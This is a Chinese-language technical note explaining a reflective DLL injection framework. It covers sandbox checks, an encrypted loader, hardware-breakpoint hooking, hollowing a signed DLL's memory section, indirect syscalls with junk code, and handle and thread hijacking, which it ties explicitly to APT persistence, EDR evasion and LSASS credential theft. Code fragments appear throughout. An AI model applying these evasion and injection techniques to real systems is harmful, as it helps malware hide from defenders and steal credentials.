---
tags:
  - 反射式注入
  - 进程注入
  - 免杀技术
date: 2026-05-31
star: true
---

# 反射DLL



反射DLL是一种高级的DLL加载技术，它通过模拟Windows加载器的工作流程，实现了从内存中直接加载DLL。通过使用Native API来达到隐蔽性的目的，并直接跳转到syscall来绕过常规的API监控。通过`sleaping`函数延迟映射恶意DLL来绕过EDR的内存扫描。可以用于APT和复杂的恶意软件中，在目标系统中长期驻留。

这项技术并非一个简单的“注入工具”，而是一个高级的、旨在实现深度隐蔽和持久化驻留的恶意代码框架。它的设计目标直指现代安全检测（如EDR、AV）的盲区。

## 实现思路

### 注入器(Stage 1)

注入器作为初始加载器，负责探测环境，查询进程信息，下载反射DLL。

当注入器通过前期的情报收集确定当前运行的环境是正常的（比如没有调试器附加，没有运行在沙箱或虚拟机中），就会开始尝试向指定进程注入DLL。这个进程可以是一些不起眼的进程，最好该进程的操作特征与反射DLL中的恶意代码相匹配（如向外网发起连接请求，扫描文件，创建或关闭进程等）。

注入器需要获取到目标进程的PID，通过`OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid)`获取目标进程的句柄，如果打开失败，则可能需要另寻其他目标，或者尝试提权。如果都以失败告终，则程序必须考虑结束自己。

在确定目标进程可以被注入之后，注入器会开始下载反射DLL并手动解析。其中最重要的一步是找到反射函数在DLL文件中的偏移，以及反射函数的大小。思路是这样的：解析DLL的导出表(EAT)，遍历整张表，找到反射函数的明文字符，获取函数地址，并使用`rva2raw`函数进行虚拟地址到文件偏移的转换，如果函数的第一条指令是跳转指令，还需要解析这条`jmp`指令得到偏移量，最终得到函数在文件中真正的起始地址。

PE 文件中的 `Exception Directory` 结构中存储了所有函数的其实地址和结束地址。遍历整个表，将`BeginAddress`与得到的`ReflectiveFunction` 的起始地址比较，得到`EndAddress`。

注入器需要使用一个加密算法加密反射函数。在得到反射函数的起始地址和函数的大小之后就会开始对反射函数进行加密。当这一切都准备妥当之后，注入器首先申请一段内存，大小为自定义头部的大小+反射DLL的大小。头部的数据包括`魔数，解密的KEY，反射函数的大小` 等。最后使用`WriteProcessMemory`向进程写入这些数据。

最后，注入器开始启动远程线程。它会先找到反射DLL中的预加载函数（方法与寻找反射函数一致），然后创建远程线程，并设置起始地址为这个预加载函数。`ResumeThread`函数执行之后，注入就完成了。



### 反射DLL (Stage 2)

**预加载函数**

预加载函数的编写与普通函数不同，该函数不能引用任何需要重定位的地址，即不能引用任何全局变量和API。`GetProcAddress` 和 `GetModuleHandle` 这些API必须手工实现。

预加载器会使用`DLL_HEADER`中的`KEY`解密反射函数，然后手动执行反射函数，等函数返回之后再重新加密并清空`KEY`。如果分析者在反射函数执行完毕后拿到程序的内存，那么这位分析者就永远无法拿到函数的代码。这样做可以尽可能的减少反射函数以明文的方式暴漏在内存的时间。

反射函数自加载它所处的反射DLL，然后返回一个DLL的基地址。接着预加载函数创建线程从DLL的入口开始执行。

**内存视图交换**

该实现的核心思路可以分为五个阶段：

1. **无痕 Hooking**：利用硬件断点（HWBP）和向量化异常处理（VEH）拦截关键内核 API。
2. **加载牺牲载体**：静默加载一个合法的系统 DLL 作为伪装外壳。
3. **狸猫换太子**：取消原合法 DLL 的内存映射，并将恶意 Section 映射到该基址。
4. **底层句柄枚举**：通过遍历系统内核对象，精准定位并窃取目标 Section 句柄。

为了在系统加载合法 DLL 时“窃取”关键信息，代码必须监控 `LoadLibrary` 底层触发的 API。传统 Inline Hook 会修改 `ntdll.dll` 的 `.text` 段，极易触发 EDR 的完整性校验。

```c
func_AddVectoredExceptionHandler(1, (PVECTORED_EXCEPTION_HANDLER)&VectorHandler);
...
set_hwbp(DrIndex::DR3, addr_NtCreateSection, zw_func_s);
set_hwbp(DrIndex::DR2, addr_NtMapViewOfSection, zw_func_s);
set_hwbp(DrIndex::DR1, addr_ZwClose, zw_func_s);
```

**硬件断点 (HWBP) + VEH (Vectored Exception Handler)**

利用 CPU 的调试寄存器（DR1-DR3），对 `NtCreateSection`、`NtMapViewOfSection` 和 `ZwClose` 这三个底层 API 下硬件断点。这种方式**完全不需要修改任何内存字节**，EDR 的内存完整性扫描对此完全免疫。当系统底层调用这些 API 时，触发硬件异常，控制权交由自定义的 `VectorHandler` 进行参数记录或逻辑篡改。

随后，代码选择加载一个系统原生的、带有完美微软签名的 DLL（示例为 `SRH.dll`）作为“替身”。

```c
sac_dll_module_by_LoadLibrary = func_LoadLibraryExA(sac_dll_path, NULL, DONT_RESOLVE_DLL_REFERENCES);
```

使用 `DONT_RESOLVE_DLL_REFERENCES` 标志。 这个标志告诉系统：**只把这个 DLL 映射到内存里，不要调用它的 `DllMain`，也不要加载它的依赖库。** 这样既实现了内存空间的占位（获取了一个合法 File-backed 的内存视图），又避免了执行未知 DLL 代码可能引发的崩溃或安全软件警报，真正做到了“静默占位”。

随后**卸载真实合法的内存视图，原址映射恶意的内存区段**。

```c
// 1. 创建全新的 Section（容纳 Payload）
ZwCreateSection(&new_section_handle, SECTION_ALL_ACCESS, ... PAGE_EXECUTE_READWRITE, SEC_COMMIT, ...);

// 2. 卸载合法的牺牲 DLL 视图
ZwUnmapViewOfSection(((HANDLE)(LONG_PTR)-1), sac_dll_module_by_LoadLibrary, ...);

// 3. 将恶意 Section 映射回刚刚卸载的基址处
sac_dll = (PVOID)sac_dll_module_by_LoadLibrary;
ZwMapViewOfSection(new_section_handle, ((HANDLE)(LONG_PTR)-1), &sac_dll, ... PAGE_EXECUTE_READWRITE, ...);
```

经过这三步操作，进程空间中原本属于 `SRH.dll` 的内存地址（该地址在系统 VAD 树中记录为由磁盘上的合法 DLL 映射而来），现在实际上被替换成了攻击者自定义的 `new_section_handle` 的内容。 当 EDR 粗略遍历内存模块或进行堆栈回溯时，看到的是一段属于微软签名 DLL 的合法内存，从而实现了完美的隐蔽（Memory Hollowing）。

默认情况下，`LoadLibrary` 在完成映射后会关闭 Section 句柄。为了获取刚刚加载的`SRH.dll` 的 Section 句柄。需要进行全局句柄枚举，通过 `ZwQuerySystemInformation(SystemHandleInformation)` 获取当前系统所有的对象句柄。筛选出属于当前进程的句柄，并调用 `ZwQueryObject(ObjectTypeInformation)`，精准筛选出类型为 `Section` 的句柄。

> Section 的两种面孔
>
> 在 Windows 内核中，区段对象（Section Object）是一块可以映射到进程虚拟地址空间的内存。但 Section 创建时，其内部属性有着本质的区别。1）Data Section（数据区段）：通常通过 `SEC_COMMIT` 或 `SEC_RESERVE` 标志创建。用于内存映射文件（如把一个 `.txt` 映射到内存）或进程间共享内存。内存管理器把它当成**一整块纯粹的二进制数据**，不关心里面的内容结构。2）Image Section（映像区段）：通过 `SEC_IMAGE` 标志创建。专门用于映射可执行文件（`.exe` 或 `.dll`）。当映射 Image Section 时，内核的内存管理器会**解析 PE 头**。它不会像数据文件那样原封不动地平铺进内存，而是根据 PE 头的 Section Table（`.text`、`.data`、`.rdata` 等）指定的相对虚拟地址（RVA）和内存对齐属性，把文件“拉伸”并重新拼装在内存中。

内存管理器在映射前，会提取 PE 头里的 `ImageBase`，然后去检查目标进程的这块地址是否被占用了。 在现代 Windows 中，由于 **ASLR（地址空间布局随机化）** 的强制启用，系统**几乎绝对不可能**把 DLL 映射到它原本固定的 `ImageBase` 上；再者，如果像代码中那样，调用 API 时由系统动态分配地址（`BaseAddress = NULL`），分配的地址也肯定和 `ImageBase` 不匹配。当系统发现分配的实际基址 $\neq$ `ImageBase` 时，内存管理器依然会完成映射操作，但它会抛出一个警告级别（Warning）的  `STATUS_IMAGE_NOT_AT_BASE (0x40000003)`，告诉调用者：“映像已经映射好了，但是位置不是它理想的首选基址，可能需要进行重定位（Relocation）。”

> **补充说明：** NTSTATUS 码的最高两位表示严重程度。`0x0...` 表示成功，`0x4...` 表示信息/警告，`0x8...` 表示错误，`0xC...` 表示严重错误。所以 `0x40000003` 代表这是一个“带有警告信息的成功”。

```c
        // ------------------------------------------------------------
        // 尝试映射该 Section 对象的一个视图
        // 若映射返回 STATUS_IMAGE_NOT_AT_BASE (0x40000003)，
        // 表示该 Section 是一个可执行映像（DLL/EXE）且未加载到首选基址，
        // 这正是我们需要的特征。
        // ------------------------------------------------------------
        if ((status = ZwMapViewOfSection(
            (void*)handle.Handle,
            ((HANDLE)(LONG_PTR)-1),
            &view_base,
            NULL, NULL, NULL,
            &view_size,
            ViewShare,
            0,
            PAGE_READONLY,
            zw_func_s[ZwMapViewOfSectionF].SSN,
            zw_func_s[ZwMapViewOfSectionF].sysretAddr))
            != 0x40000003)
        {

            // 如果映射成功（status == 0）但不是预期的状态，说明不是 DLL 映像，需要清理并继续
            if (status == 0)
            {
                if (status = ZwUnmapViewOfSection(
                    ((HANDLE)(LONG_PTR)-1), view_base,
                    zw_func_s[ZwUnmapViewOfSectionF].SSN,
                    zw_func_s[ZwUnmapViewOfSectionF].sysretAddr
                ) != 0)
                {
                    return FALSE;
                }
            }

            view_base = NULL;
            continue;
        }
```

通过这种方式，我们把鉴别工作直接推给了 Windows 内核的内存管理器。在 Ring 0 层瞬间过滤掉 99% 的无用 Data Section，只留下属于 PE 映像的区段。它不需要在用户态手动解析未知的内存结构，完全避免了因为内存访问越界（Access Violation）导致的恶意软件自杀。这个鉴别过程不涉及任何内存读取动作，只是正常的 API 调用，EDR 根本无法从行为上判定这是一个“正在扫描 PE 头部”的恶意操作。（但是高频的`ZwMapViewOfSection`可以引起EDR的关注）

**反射函数自加载**

最后反射函数手动完成将 PE（Portable Executable）文件格式在内存中展开、解析和初始化的全过程。反射加载器函数首先需要找到自身以及它所承载的完整 DLL 在当前进程内存中的起始地址。找到基址后，加载器开始充当系统加载器的角色，解析原始文件格式的 PE 结构。PE 文件在磁盘上的紧凑物理布局（Raw Data）和在内存中按页对齐的虚拟布局（Virtual Data）是不同的。加载器需要完成这种布局转换。

被加载的 DLL 运行必定需要调用外部系统的 API（例如 `user32.dll` 中的 `MessageBoxA`）。

- 加载器解析 **导入目录 (Import Directory)**，找出该 DLL 依赖的所有外部模块（DLL）名称。
- 通过手动遍历系统结构（如 PEB 的加载模块列表）或调用正常的 `LoadLibrary` 来加载这些依赖模块。
- 接着，解析每个需要导入的函数名或序号，通过 `GetProcAddress`（或其底层手动实现）获取这些函数在当前系统中的真实内存地址。
- 最后，将这些真实的绝对地址填入当前 DLL 的 **导入地址表 (IAT)** 中。

由于系统安全机制（如 ASLR）或内存占用的原因，加载器分配的新内存基址极大概率不等于 DLL 编译时预设的 **首选基址 (ImageBase)**。此时，DLL 内部硬编码的全局变量或绝对内存跳转地址就会全部失效。

- 加载器读取 **基址重定位表 (Base Relocation Table)**。
- 计算出实际加载基址与首选基址之间的差值（Delta）。
- 遍历重定位表，将这个差值逐一加到需要修正的硬编码地址上，完成内存地址的动态修复。

**内存地址重用**


反射DLL的内存驻留方案核心是通过内存地址重用技术，实现在同一内存地址无缝替换DLL，同时保持执行连续性。这是一种高级的进程内存操作技术。在`sleaping`函数中实现。

**sleaping**

```c
int sleaping(
    PVOID image_base,
    HANDLE sac_dll_handle,
    HANDLE mal_dll_handle,
    SIZE_T view_size,
    PNT_FUNCTIONS nt_func_s,
    PVOID NtTestAlert_addr
);
```

`image_base` 是当前模块的基地址，同时也是sac_dll的基地址（由LoadLibraryEx("SRH.dll", ... )函数加载确定。`sac_dll_handle` 是`SRH.dll`的Section句柄，而`mal_dll_handle` 是我们后续通过`NtCreateSection`函数新创建的Section句柄（对应于反射DLL本身）。我们需要保证当前进程中所有线程都没有引用`image_base -> image_base + view_size` 这块内存。我们的思路也很简单，将当前执行`sleaping`的线程挂起，并新创建几个线程进行`UnMapViewOfFile(image_base)`，并调用`MapViewOfFileEx(sac_dll -> image_base)` 进行重映射即可。下面展示了`sleaping`函数的时序分析结果：

```
Main thread
    │
    ├─ Initialization phase (0-several ms)
    │   ├─ Create event object
    │   ├─ Allocate CONTEXT memory
    │   └─ Create thread 2 (suspended state)
    │
    ├─ Configure thread 2
    │   ├─ Get thread context
    │   ├─ Modify to WaitForSingleObjectEx(NtTestAlert returns)
    │   └─ Resume thread 2 execution
    │
    ├─ Create other threads
    │   ├─ CreateThread0 (suspended): UnmapViewOfFile
    │   ├─ CreateThread1 (suspended): MapViewOfFileEx(sac_dll)
    │   └─ CreateThread3 (suspended): MapViewOfFileEx(mal_dll)
    │
    ├─ Configure thread context
    │   ├─ Thread 0: UnmapViewOfFile(image_base)
    │   ├─ Thread 1: MapViewOfFileEx(sac_dll→image_base)
    │   └─ Thread 3: MapViewOfFileEx(mal_dll→image_base)
    │
    ├─ Create timer queue
    │
    ├─ Set APC queue (thread 2)
    │   ├─ APC1: UnmapViewOfFile(image_base)
    │   ├─ APC2: ResumeThread (Thread 3)
    │   └─ APC3: ExitThread (thread 2 itself)
    │
    ├─ Set timer
    │   ├─ Timer 1 (200ms): ResumeThread (Thread 0)
    │   └─ Timer 2 (300ms): ResumeThread (Thread 1)
    │
    └─ Wait for all threads to complete
```

## 免杀扩展

如果只是完全按照上面的描述去实现注入器，大概率会被杀毒软件或EDR拦截。下面介绍一些更难以检测的注入方式。

> **Note**
>
> 没有任何一种单独的技术可以做到完全规避所有的检测，在实践中需要组合搭配多种技术。甚至是调查目标的系统环境，针对性的开发。

### 间接syscall(Indirect Syscall)

如果我们只是简单的调用`CreateRemoteThread`来注入，那么肯定会被安全软件拦截，安全软件普遍都会在核心的`API`做Hook。

**间接syscall**不直接调用这些API，而是通过构造好参数，然后跳转到对应的 NTAPI 中的`syscall` 指令去执行。

```rust
// ═══════════════════════════════════════════════════
// NtCreateThreadEx (ZwCreateThreadEx)
// ═══════════════════════════════════════════════════
#[unsafe(naked)]
#[unsafe(no_mangle)]
pub unsafe extern "win64" fn zw_create_thread_ex(
    thread_handle:      *mut HANDLE,
    desired_access:     u32,
    object_attributes:  *mut OBJECT_ATTRIBUTES,
    process_handle:     HANDLE,
    start_routine:      *mut c_void,
    argument:           *mut c_void,
    create_flags:       u64,
    zero_bits:          usize,
    stack_size:         usize,
    max_stack_size:     usize,
    attribute_list:     *mut c_void,
    ssn:                u32,
    syscall_ret:        *mut u8,
) -> i32 {
    naked_asm!(
        "mov r10, rcx",
        "mov eax, dword ptr [rsp + 96]",
        "jmp qword ptr [rsp + 104]"
    )
}
```

使用这个函数时，我们仅仅需要多传入两个参数，该API对应的ssn和syscall指令的地址，其他部分与调用`NtCreateThreadEx`函数一样。

为了防止规则匹配或者静态模式匹配，我们还可以为这些函数添加花指令(junk code)。

```assembly
ZwSetContextThread PROC
	mov r10, rcx
	mov r11, rax
	shl r11, 11h
	shr r11, 11h
	xor rcx, r11
	mov rax, rcx
	sub rax, rcx
	movd xmm4, eax
	paddd xmm4, xmm5
	psubd xmm4, xmm5
	pxor xmm4, xmm5
	mov eax, r8d
	jmp r9
ZwSetContextThread ENDP
```





### 句柄劫持(Handle Hijacking)

当程序调用 `OpenProcess`（底层为 `NtOpenProcess`）试图获取另一个进程的句柄时，现代 EDR 通常通过以下两种方式进行拦截或告警：

- **用户层 Hook (Ring 3)：** 在 `ntdll.dll` 中 Hook `NtOpenProcess`。
- **内核层回调 (Ring 0)：** 使用微软提供的 `ObRegisterCallbacks` 注册对象回调。当有进程尝试请求受保护进程的 `PROCESS_ALL_ACCESS` 或 `PROCESS_VM_READ` 等高危权限时，EDR 会在内核层面直接降权或拒绝访问。比如当你想要读取某敏感进程的内存，你可能会使用`NtOpenProcess`函数搭配`PROCESS_VM_READ`。EDR的内核驱动会直接把这个请求的标志位清除。

我们可以转用**句柄劫持(Handle Hijacking)**的技术来绕过这一检测。

首先使用Windows提供的API来进行系统环境信息收集。调用未文档化的 API `NtQuerySystemInformation`，并传入参数 `SystemHandleInformation` (0x10) 或 `SystemExtendedHandleInformation` (0x40)。这个 API 会返回当前操作系统中**所有**打开的句柄列表。返回的数据包含每个句柄的宿主进程 PID（谁拥有这个句柄）、句柄的值、句柄的类型（是文件、注册表还是进程/线程），以及该句柄拥有的访问权限（GrantedAccess）。

遍历这个庞大的系统句柄列表，寻找满足以下条件的句柄：

- **类型匹配：** 句柄类型必须是“进程”（Process）。
- **权限满足：** 句柄的权限（GrantedAccess）必须满足自己的需求，例如包含 `PROCESS_VM_READ`（用于读取内存，如 Dump LSASS）或 `PROCESS_VM_WRITE | PROCESS_VM_OPERATION`（用于注入代码）。
- **目标匹配：** 通过一些手段（如 `NtQueryInformationProcess`）确认这个句柄指向的到底是不是它想攻击的目标进程（比如 `lsass.exe`）。

如果我们发现某个进程（通常是系统进程）持有一个指向目标进程的高权限句柄。此时，我们只需要调用`OpenProcess` 打开这个系统进程，请求权限为`PROCESS_DUP_HANDLE`。

EDR对普通的 `svchost.exe` 申请 `PROCESS_DUP_HANDLE` 权限的监控可能相对宽松，因为系统进程之间互相复制句柄是操作系统的正常行为。

一旦成功获取了宿主进程的句柄，调用 `DuplicateHandle`（底层为 `NtDuplicateObject`）。接下来就可以使用这个偷来的句柄调用 `ReadProcessMemory`、`WriteProcessMemory` 或 `CreateRemoteThread`，从而完成凭证窃取或代码注入。

### 等待线程劫持(Waiting Thread Hijacking)

当一个进程尝试通过 `CreateRemoteThread` 或 `NtCreateThreadEx` 在另一个进程（如 `explorer.exe`）中创建新线程时，EDR 的内核回调或用户层 Hook 会立刻捕获这一行为。

目标进程中通常有很多线程，有的在执行计算，有的在渲染 UI。当线程处于等待状态（例如调用了 `Sleep`、`WaitForSingleObject`、等待 I/O 操作完成）的线程，其 CPU 寄存器状态是稳定且可预测的，劫持它们并恢复现场的成功率最高。

**上下文修改**

如果你只想找一个已知 PID 的进程中等待线程，可考虑使用更稳定的公开 API，如 `CreateToolhelp32Snapshot` + `Thread32First/Next` 获取线程ID，再结合 `WaitForSingleObject` 等检查，但这需要进程句柄且效率较低。

调用未文档化的 API `NtQuerySystemInformation`，并传入参数`SystemProcessInformation` (0x05)。

使用 `SystemProcessInformation` 会返回一个巨大的内存块，里面包含所有进程的信息。每个进程信息后面，紧跟着属于该进程的所有线程信息。我们需要定义两个未文档化的结构体：

```c++
typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemProcessInformation = 5
} SYSTEM_INFORMATION_CLASS;

typedef LONG KPRIORITY; // 来自 winternl.h

typedef enum _KTHREAD_STATE {
    StateInitialized,
    StateReady,
    StateRunning,
    StateStandby,
    StateTerminated,
    StateWaiting,           // 目标状态
    StateTransition,
    StateDeferredReady,
    StateGateWaitObsolete,
    StateMaximum
} KTHREAD_STATE;

// 与 phnt 定义对齐（适用于 Windows 7+）
typedef struct _SYSTEM_THREAD_INFORMATION {
    LARGE_INTEGER KernelTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER CreateTime;
    ULONG         WaitTime;
    PVOID         StartAddress;
    CLIENT_ID     ClientId;          // 包含 UniqueProcess 和 UniqueThread
    KPRIORITY     Priority;
    KPRIORITY     BasePriority;
    ULONG         ContextSwitches;
    KTHREAD_STATE ThreadState;       // 线程状态
    ULONG         WaitReason;        // 等待原因 (KWAIT_REASON)
} SYSTEM_THREAD_INFORMATION;

typedef struct _SYSTEM_PROCESS_INFORMATION {
    ULONG         NextEntryOffset;
    ULONG         NumberOfThreads;
    LARGE_INTEGER WorkingSetPrivateSize; // VISTA+
    ULONG         HardFaultCount;        // WIN7+
    ULONG         NumberOfThreadsHighWatermark; // WIN7+
    ULONGLONG     CycleTime;             // WIN7+
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    KPRIORITY     BasePriority;
    HANDLE        UniqueProcessId;
    HANDLE        InheritedFromUniqueProcessId;
    ULONG         HandleCount;
    ULONG         SessionId;
    ULONG_PTR     UniqueProcessKey;      // VISTA+
    SIZE_T        PeakVirtualSize;
    SIZE_T        VirtualSize;
    ULONG         PageFaultCount;
    SIZE_T        PeakWorkingSetSize;
    SIZE_T        WorkingSetSize;
    SIZE_T        QuotaPeakPagedPoolUsage;
    SIZE_T        QuotaPagedPoolUsage;
    SIZE_T        QuotaPeakNonPagedPoolUsage;
    SIZE_T        QuotaNonPagedPoolUsage;
    SIZE_T        PagefileUsage;
    SIZE_T        PeakPagefileUsage;
    SIZE_T        PrivatePageCount;
    LARGE_INTEGER ReadOperationCount;
    LARGE_INTEGER WriteOperationCount;
    LARGE_INTEGER OtherOperationCount;
    LARGE_INTEGER ReadTransferCount;
    LARGE_INTEGER WriteTransferCount;
    LARGE_INTEGER OtherTransferCount;
    // 后面紧跟着 SYSTEM_THREAD_INFORMATION 数组，无需在此定义占位
} SYSTEM_PROCESS_INFORMATION;

// 函数指针类型
typedef NTSTATUS (NTAPI *pNtQuerySystemInformation)(
    _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,
    _Inout_   PVOID                    SystemInformation,
    _In_      ULONG                    SystemInformationLength,
    _Out_opt_ PULONG                   ReturnLength
);
```

如果是进行 **APC 注入**，不仅要求线程处于 Wait 状态，还需要线程处于 `Alertable`（可警告）状态。通常，攻击者会进一步检查 `WaitReason`。例如，`WaitReason` 为 `DelayExecution` (通常是调用 `Sleep` 引起的) 或者是 `UserRequest` (等待用户输入) 的线程，被唤醒或接受 APC 的概率更高。

一旦找到 `ThreadState == 5` 的线程，通过 `Threads[i].ClientId.UniqueThread` 就能拿到该线程的 TID（Thread ID）。接下来，攻击者就可以拿着这个 TID 去调用 `OpenThread` 进行挂起和上下文修改了。

---
- [[computer-security/methodology/malware-analysis/malware-analysis|病毒分析]]